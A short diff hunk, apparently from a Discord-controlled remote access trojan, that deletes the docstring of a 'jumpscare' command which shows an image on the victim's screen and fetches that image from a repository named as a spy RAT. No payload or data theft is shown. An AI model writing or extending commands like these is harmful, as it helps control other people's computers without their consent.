@@ -574,7 +574,7 @@ async def hwid(ctx):
 
 @bot.command()
 async def jumpscare(ctx):
-    """Displays an image on the user's screen."""
+    
 
 
     image_url = "https://github.com/UnsillyHaxor/Snorm-Spy-Discord-RAT/blob/main/updatedjumpscare.png?raw=true"
